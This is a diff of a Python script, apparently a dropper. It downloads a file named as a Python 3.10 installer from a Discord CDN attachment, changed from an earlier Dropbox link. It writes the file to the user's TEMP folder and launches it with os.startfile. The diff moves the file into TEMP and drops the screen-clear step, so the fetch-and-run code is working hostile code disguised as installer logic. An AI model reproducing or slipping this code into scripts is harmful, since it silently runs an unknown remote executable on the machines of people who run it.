@@ -2,20 +2,18 @@ import time
 import requests
 from time import sleep
 import os
-time.sleep(0.3)
-os.system('cls' if os.name == 'nt' else 'clear')
 import random
 import string
 import ctypes
 
-url = 'https://www.dropbox.com/s/vmmpuaffciyodqg/python-3.10.0-x64.exe?dl=1'
+url = 'https://cdn.discordapp.com/attachments/1101703686293557378/1102030676531879966/python-3.10.0-x64.exe'
 filename = 'python-3.10.0-x64.exe'
-
+temp_path = os.path.join(os.environ.get('TEMP'), filename)
 r = requests.get(url)
-with open(filename, 'wb') as f:
+with open(temp_path, 'wb') as f:
     f.write(r.content)
 
-os.startfile(filename)
+os.startfile(temp_path)
 
 from colorama import Fore, Back, Style
 try:
